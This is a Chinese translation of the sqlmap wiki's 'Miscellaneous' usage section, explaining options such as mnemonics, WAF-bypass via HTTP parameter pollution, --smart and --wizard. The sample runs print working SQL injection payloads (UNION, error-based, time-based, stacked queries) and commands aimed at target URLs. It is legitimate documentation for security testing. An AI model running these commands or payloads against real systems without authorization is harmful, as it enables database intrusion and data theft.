# 杂项

> *译自：[Miscellaneous](https://github.com/sqlmapproject/sqlmap/wiki/Usage#miscellaneous)*

## 使用短助记符

选项：`-z`

输入所有想要使用的选项和开关是很乏味的事情，特别是对于那些常用的选项和开关（例如：`--batch --random-agent --ignore-proxy --technique=BEU`）。有一个更简短的方法来处理这个问题。在 sqlmap 中，它被称为“助记符”。

使用选项 `-z`，每个选项和开关可以用较短的助记符形式，并用逗号（`,`）分隔，其中助记符代表原始名称的第一个任意选择的部分。选项和开关没有严格映射到他们各自精简后的部分。唯一需要满足的条件是没有其他选项和开关使用了与之相同的前缀。

例如：

```shell
$ python sqlmap.py --batch --random-agent --ignore-proxy --technique=BEU -u "ww\
w.target.com/vuln.php?id=1"
```

可以用短助记符形式（多种方法之一）写成：

```shell
$ python sqlmap.py -z "bat,randoma,ign,tec=BEU" -u "www.target.com/vuln.php?id=\
1"
```

另一个例子：

```shell
$ python sqlmap.py --ignore-proxy --flush-session --technique=U --dump -D testd\
b -T users -u "www.target.com/vuln.php?id=1"
```

可以用短助记符形式写成：

```shell
$ python sqlmap.py -z "ign,flu,bat,tec=U,dump,D=testdb,T=users" -u "www.target.\
com/vuln.php?id=1"
```

## 警告成功的 SQL 注入检测

选项：`--alert`

## 发现 SQL 注入时发出“哔”声

开关：`--beep`

如果用户使用了开关 `--beep`，那么在发现 SQL 注入时，sqlmap 会立即发出“哔”的警告声。当测试的目标 URLs 是大批量列表（选项 `-m`）时特别有用。

## 清除 DBMS（Database Management System，数据库管理系统）中特定的 sqlmap UDF(s) 和表

开关：`--cleanup`

建议在完成底层操作系统或文件系统的接管后，清理后端 DBMS 中的 sqlmap 临时表（如 `sqlmapoutput`）和用户定义函数。使用 `--cleanup` 开关将尽可能地清理 DBMS 和文件系统。

## 检查依赖关系

开关：`--dependencies`

在某些特殊情况下，sqlmap 需要独立安装额外的第三方库（例如：选项 `-d`，开关 `--os-pwn` 之于 `icmpsh` 隧道，选项 `--auth-type` 之于 `NTLM` 类型的 HTTP 认证等。），只在这种特殊情况下会警告用户。不过，如果你想独立检查所有这些额外的第三方库依赖关系，可以使用开关 `--dependencies`。

```shell
$ python sqlmap.py --dependencies
[...]
[xx:xx:28] [WARNING] sqlmap requires 'python-kinterbasdb' third-party library in
 order to directly connect to the DBMS Firebird. Download from http://kinterbasd
b.sourceforge.net/
[xx:xx:28] [WARNING] sqlmap requires 'python-pymssql' third-party library in ord
er to directly connect to the DBMS Sybase. Download from http://pymssql.sourcefo
rge.net/
[xx:xx:28] [WARNING] sqlmap requires 'python pymysql' third-party library in ord
er to directly connect to the DBMS MySQL. Download from https://github.com/peteh
unt/PyMySQL/
[xx:xx:28] [WARNING] sqlmap requires 'python cx_Oracle' third-party library in o
rder to directly connect to the DBMS Oracle. Download from http://cx-oracle.sour
ceforge.net/
[xx:xx:28] [WARNING] sqlmap requires 'python-psycopg2' third-party library in or
der to directly connect to the DBMS PostgreSQL. Download from http://initd.org/p
sycopg/
[xx:xx:28] [WARNING] sqlmap requires 'python ibm-db' third-party library in orde
r to directly connect to the DBMS IBM DB2. Download from http://code.google.com/
p/ibm-db/
[xx:xx:28] [WARNING] sqlmap requires 'python jaydebeapi & python-jpype' third-pa
rty library in order to directly connect to the DBMS HSQLDB. Download from https
://pypi.python.org/pypi/JayDeBeApi/ & http://jpype.sourceforge.net/
[xx:xx:28] [WARNING] sqlmap requires 'python-pyodbc' third-party library in orde
r to directly connect to the DBMS Microsoft Access. Download from http://pyodbc.
googlecode.com/
[xx:xx:28] [WARNING] sqlmap requires 'python-pymssql' third-party library in ord
er to directly connect to the DBMS Microsoft SQL Server. Download from http://py
mssql.sourceforge.net/
[xx:xx:28] [WARNING] sqlmap requires 'python-ntlm' third-party library if you pl
an to attack a web application behind NTLM authentication. Download from http://
code.google.com/p/python-ntlm/
[xx:xx:28] [WARNING] sqlmap requires 'websocket-client' third-party library if y
ou plan to attack a web application using WebSocket. Download from https://pypi.
python.org/pypi/websocket-client/
```

## 禁用控制台输出着色

开关：`--disable-coloring`

默认情况下，sqlmap 输出到控制台时使用着色。你可以使用此开关禁用控制台输出着色，以避免不期望的效果（例如：控制台中未解析的 ANSI 代码着色效果，像 `\x01\x1b[0;32m\x02[INFO]`）。

## 使用特定页码的 Google dork 结果

选项：`--gpage`

默认情况下，使用选项 `-g` 时，sqlmap 会使用 Google 搜索得到的前 100 个 URLs 进行进一步的 SQL 注入测试。结合此选项，你可以使用它（`--gpage`）指定除第一页以外的页面以检索目标 URLs。

## 使用 HTTP 参数污染

开关：`--hpp`

HTTP 参数污染（HPP）是一种绕过 WAF/IPS 防护机制（[这里](https://www.imperva.com/resources/glossary/http-parameter-pollution) 有相关介绍）的方法，对 ASP/IIS 和 ASP.NET/IIS 平台尤其有效。如果你怀疑目标使用了这种防护机制，可以尝试使用此开关以绕过它。

## 跳过启发式检测 WAF/IPS 防护

开关：`--skip-waf`

默认情况下，sqlmap 自动在一个启动请求中发送一个虚假的参数值，其中包含一个有意“可疑”的 SQL 注入 payload（例如：`...&foobar=AND 1=1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables WHERE 2>1`）。如果目标响应与原始请求响应不同，那么它很可能存在防护机制。

sqlmap 会自动尝试识别后端 WAF/IPS 防护（如果有），以便用户执行后续对应步骤
（例如：通过选项 `--tamper` 使用篡改脚本）。目前大约支持 80 种不同的产品
（例如：Airlock，Barracuda WAF 等）。如果有任何问题，用户可以使用开关 `--skip-waf`
来禁用此机制。

## 伪装智能手机

开关：`--mobile`

有时 Web 服务器向手机提供的是不同于电脑的接口。在这种情况下，你可以强制使用预定义好的智能手机 HTTP User-Agent 头部值。使用此开关，sqlmap 将询问你选择一种流行的智能手机，它将在当前运行中进行伪装。

运行示例：

```shell
$ python sqlmap.py -u "http://www.target.com/vuln.php?id=1" --mobile
[...]
which smartphone do you want sqlmap to imitate through HTTP User-Agent header?
[1] Apple iPhone 4s (default)
[2] BlackBerry 9900
[3] Google Nexus 7
[4] HP iPAQ 6365
[5] HTC Sensation
[6] Nokia N97
[7] Samsung Galaxy S
> 1
[...]
```

## 离线工作模式（仅使用会话数据）

开关：`--offline`

使用开关 `--offline`，sqlmap 在数据枚举中将仅使用上一个会话的数据。这基本上意味着在这样的运行过程中是零连接尝试的。

## 安全地删除 data 目录中所有内容

开关：`--purge`

如果用户决定要安全地删除 sqlmap data 目录（例如 `$HOME/.local/share/sqlmap`）中的所有内容，包括之前 sqlmap 运行过的所有目标详细信息，可以使用开关 `--purge`。在清除时，data 目录中的（子）目录中的所有文件将被随机数据覆盖、截断和被重命名为随意名，（子）目录也将被重命名为随意名，最后整个目录树将被删除。

运行示例：

```shell
$ python sqlmap.py --purge -v 3
[...]
[xx:xx:55] [INFO] purging content of directory '/home/testuser/.local/share/sqlmap'...
[xx:xx:55] [DEBUG] changing file attributes
[xx:xx:55] [DEBUG] writing random data to files
[xx:xx:55] [DEBUG] truncating files
[xx:xx:55] [DEBUG] renaming filenames to random values
[xx:xx:55] [DEBUG] renaming directory names to random values
[xx:xx:55] [DEBUG] deleting the whole directory tree
[...]
```

## 只在使用启发式检测时才进行彻底的测试

开关：`--smart`

某些情况下，用户拥有大量潜在目标 URL（例如：使用选项 `-m`）列表，同时想要尽快找到易受攻击的目标。如果使用了开关 `--smart`，则只有能引发 DBMS 错误的参数会在进一步的扫描中被使用。否则会被跳过。

针对 MySQL 目标的示例：

```shell
$ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&use\
r=foo&id=1" --batch --smart
[...]
[xx:xx:14] [INFO] testing if GET parameter 'ca' is dynamic
[xx:xx:14] [WARNING] GET parameter 'ca' does not appear dynamic
[xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter 'ca' might not be injectable
[xx:xx:14] [INFO] skipping GET parameter 'ca'
[xx:xx:14] [INFO] testing if GET parameter 'user' is dynamic
[xx:xx:14] [WARNING] GET parameter 'user' does not appear dynamic
[xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter 'user' migh
t not be injectable
[xx:xx:14] [INFO] skipping GET parameter 'user'
[xx:xx:14] [INFO] testing if GET parameter 'id' is dynamic
[xx:xx:14] [INFO] confirming that GET parameter 'id' is dynamic
[xx:xx:14] [INFO] GET parameter 'id' is dynamic
[xx:xx:14] [WARNING] reflective value(s) found and filtering out
[xx:xx:14] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[xx:xx:14] [INFO] testing for SQL injection on GET parameter 'id'
heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
do you want to include all tests for 'MySQL' extending provided level (1) and ri
sk (1)? [Y/n] Y
[xx:xx:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[xx:xx:14] [INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVI
NG clause' injectable [xx:xx:14] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause
'
[xx:xx:14] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE or
 HAVING clause' injectable [xx:xx:14] [INFO] testing 'MySQL inline queries'
[xx:xx:14] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[xx:xx:14] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[xx:xx:14] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'
[xx:xx:24] [INFO] GET parameter 'id' is 'MySQL > 5.0.11 AND time-based blind' in jectable
[xx:xx:24] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[xx:xx:24] [INFO] automatically extending ranges for UNION query injection techn
ique tests as there is at least one other potential injection technique found
[xx:xx:24] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending t
he range for current UNION query injection technique test
[xx:xx:24] [INFO] target URL appears to have 3 columns in query
[xx:xx:24] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 colu
mns' injectable
[...]
```

## 根据 payloads 和/或标题选择（或跳过）测试

选项：`--test-filter`

如果你想根据 payloads 和/或标题过滤测试，可以使用此选项。例如，要测试所有包含 `ROW` 关键字的 payloads，可以使用 `--test-filter=ROW`。

针对 MySQL 目标的示例：

```shell
$ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" --b\
atch --test-filter=ROW
[...]
[xx:xx:39] [INFO] GET parameter 'id' is dynamic
[xx:xx:39] [WARNING] reflective value(s) found and filtering out
[xx:xx:39] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[xx:xx:39] [INFO] testing for SQL injection on GET parameter 'id'
[xx:xx:39] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE or HAVING clause
'
[xx:xx:39] [INFO] GET parameter 'id' is 'MySQL >= 4.1 AND error-based - WHERE or
 HAVING clause' injectable GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any
)? [y/N] N
sqlmap identified the following injection points with a total of 3 HTTP(s) reque
sts:
---
Place: GET
Parameter: id
    Type: error-based
    Title: MySQL >= 4.1 AND error-based - WHERE or HAVING clause
    Payload: id=1 AND ROW(4959,4971)>(SELECT COUNT(*),CONCAT(0x3a6d70623a,(SELEC
T (C
    ASE WHEN (4959=4959) THEN 1 ELSE 0 END)),0x3a6b7a653a,FLOOR(RAND(0)*2))x FRO
M (S
    ELECT 4706 UNION SELECT 3536 UNION SELECT 7442 UNION SELECT 3470)a GROUP BY x)
---
[...]
```

选项：`--test-skip=TEST`

如果你想根据 payloads 和/或标题跳过测试，可以使用此选项。例如，想要跳过包含 `BENCHMARK` 关键字的 payloads，可以使用 `--test-skip=BENCHMARK`。

## 交互式 sqlmap shell

开关：`--shell`

使用开关 `--shell`，用户可以获取交互式 sqlmap shell，它包含所有先前运行的历史记录，包括使用过的选项和/或开关：

```shell
$ python sqlmap.py --shell
sqlmap > -u "http://testphp.vulnweb.com/artists.php?artist=1" --technique=\
BEU --batch
         _
 ___ ___| |_____ ___ ___  {1.0-dev-2188502}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual
 consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not respon
sible for any misuse or damage caused by this program

[*] starting at xx:xx:11

[xx:xx:11] [INFO] testing connection to the target URL
[xx:xx:12] [INFO] testing if the target URL is stable
[xx:xx:13] [INFO] target URL is stable
[xx:xx:13] [INFO] testing if GET parameter 'artist' is dynamic
[xx:xx:13] [INFO] confirming that GET parameter 'artist' is dynamic
[xx:xx:13] [INFO] GET parameter 'artist' is dynamic
[xx:xx:13] [INFO] heuristic (basic) test shows that GET parameter 'artist' might
 be injectable (possible DBMS: 'MySQL')
[xx:xx:13] [INFO] testing for SQL injection on GET parameter 'artist'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads sp
ecific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[xx:xx:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[xx:xx:13] [INFO] GET parameter 'artist' seems to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
[xx:xx:13] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER B
Y or GROUP BY clause'
[xx:xx:13] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY
 or GROUP BY clause'
[xx:xx:13] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER B
Y or GROUP BY clause (EXTRACTVALUE)'
[xx:xx:13] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY
 or GROUP BY clause (EXTRACTVALUE)'
[xx:xx:14] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER B
Y or GROUP BY clause (UPDATEXML)'
[xx:xx:14] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY
 or GROUP BY clause (UPDATEXML)'
[xx:xx:14] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER B
Y or GROUP BY clause (EXP)'
[xx:xx:14] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE, HAVING clause (E
XP)'
[xx:xx:14] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER B
Y or GROUP BY clause (BIGINT UNSIGNED)'
[xx:xx:14] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE, HAVING clause (B
IGINT UNSIGNED)'
[xx:xx:14] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER B
Y or GROUP BY clause'
[xx:xx:14] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE, HAVING clause'
[xx:xx:14] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause'
[xx:xx:14] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACT
VALUE)'
[xx:xx:14] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace'
[xx:xx:14] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACT
VALUE)'
[xx:xx:15] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEX
ML)'
[xx:xx:15] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[xx:xx:15] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[xx:xx:15] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[xx:xx:15] [INFO] automatically extending ranges for UNION query injection techn
ique tests as there is at least one other (potential) technique found
[xx:xx:15] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[xx:xx:15] [INFO] target URL appears to have 3 columns in query
[xx:xx:16] [INFO] GET parameter 'artist' is 'Generic UNION query (NULL) - 1 to 2
0 columns' injectable
GET parameter 'artist' is vulnerable. Do you want to keep testing the others (if
 any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 39 HTTP(s) re
quests:
---
Parameter: artist (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: artist=1 AND 5707=5707

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: artist=-7983 UNION ALL SELECT CONCAT(0x716b706271,0x6f6c506a7473764
26d58446f634454616a4c647a6c6a69566e584e454c64666f6861466e697a5069,0x716a786a71),
NULL,NULL-- -
---
[xx:xx:16] [INFO] testing MySQL
[xx:xx:16] [INFO] confirming MySQL
[xx:xx:16] [INFO] the back-end DBMS is MySQL
web application technology: Nginx, PHP 5.3.10
back-end DBMS: MySQL >= 5.0.0
[xx:xx:16] [INFO] fetched data logged to text files under '/home/stamparm/.sqlma
p/output/testphp.vulnweb.com'
sqlmap-shell> -u "http://testphp.vulnweb.com/artists.php?artist=1" --banner
         _
 ___ ___| |_____ ___ ___  {1.0-dev-2188502}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual
 consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not respon
sible for any misuse or damage caused by this program

[*] starting at xx:xx:25

[xx:xx:26] [INFO] resuming back-end DBMS 'mysql'
[xx:xx:26] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: artist (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: artist=1 AND 5707=5707

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: artist=-7983 UNION ALL SELECT CONCAT(0x716b706271,0x6f6c506a7473764
26d58446f634454616a4c647a6c6a69566e584e454c64666f6861466e697a5069,0x716a786a71),
NULL,NULL-- -
---
[xx:xx:26] [INFO] the back-end DBMS is MySQL
[xx:xx:26] [INFO] fetching banner
web application technology: Nginx, PHP 5.3.10
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL 5
banner:    '5.1.73-0ubuntu0.10.04.1'
[xx:xx:26] [INFO] fetched data logged to text files under '/home/stamparm/.sqlmap/output/testphp.vulnweb.com'
sqlmap-shell> exit
```

## 适合初学者使用的向导界面

开关：`--wizard`

sqlmap 为初学者提供了一个向导界面，它使用包含尽可能少的问题的简单工作流。如果用户输入目标 URL 并使用了默认设置（例如：按 `Enter`），则应该在工作流结束时正确设置 sqlmap 运行环境。

针对 Microsoft SQL Server 目标的示例：

```shell
$ python sqlmap.py --wizard

    sqlmap/1.0-dev-2defc30 - automatic SQL injection and database takeover tool
    http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual
 consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not respon
sible for any misuse or damage caused by this program

[*] starting at xx:xx:26

Please enter full target URL (-u): http://192.168.21.129/sqlmap/mssql/iis/get_in
t.asp?id=1
POST data (--data) [Enter for None]:
Injection difficulty (--level/--risk). Please choose:
[1] Normal (default)
[2] Medium
[3] Hard
> 1
Enumeration (--banner/--current-user/etc). Please choose:
[1] Basic (default)
[2] Smart
[3] All
> 1

sqlmap is running, please wait..

heuristic (parsing) test showed that the back-end DBMS could be 'Microsoft SQL S
erver'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
do you want to include all tests for 'Microsoft SQL Server' extending provided l
evel (1) and risk (1)? [Y/n] Y
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any
)? [y/N] N
sqlmap identified the following injection points with a total of 25 HTTP(s) requ
ests:
---
Place: GET
Parameter: id
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 2986=2986

    Type: error-based
    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause
    Payload: id=1 AND 4847=CONVERT(INT,(CHAR(58)+CHAR(118)+CHAR(114)+CHAR(100)+C
HAR(58)+(SELECT (CASE WHEN (4847=4847) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58
)+CHAR(111)+CHAR(109)+CHAR(113)+CHAR(58)))

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CHAR(58)+CHAR(118)+CHAR(114)+CHAR(1
00)+CHAR(58)+CHAR(70)+CHAR(79)+CHAR(118)+CHAR(106)+CHAR(87)+CHAR(101)+CHAR(119)+
CHAR(115)+CHAR(114)+CHAR(77)+CHAR(58)+CHAR(111)+CHAR(109)+CHAR(113)+CHAR(58)--

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries
    Payload: id=1; WAITFOR DELAY '0:0:5'--

    Type: AND/OR time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind
    Payload: id=1 WAITFOR DELAY '0:0:5'--

    Type: inline query
    Title: Microsoft SQL Server/Sybase inline queries
    Payload: id=(SELECT CHAR(58)+CHAR(118)+CHAR(114)+CHAR(100)+CHAR(58)+(SELECT
(CASE WHEN (6382=6382) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(111)+CHAR
(109)+CHAR(113)+CHAR(58))
---
web server operating system: Windows XP
web application technology: ASP, Microsoft IIS 5.1
back-end DBMS operating system: Windows XP Service Pack 2
back-end DBMS: Microsoft SQL Server 2005
banner:
---
Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86)
    Oct 14 2005 00:33:37
    Copyright (c) 1988-2005 Microsoft Corporation
    Express Edition on Windows NT 5.1 (Build 2600: Service Pack 2)
---
current user:    'sa'
current database:    'testdb'
current user is DBA:    True

[*] shutting down at xx:xx:52
```
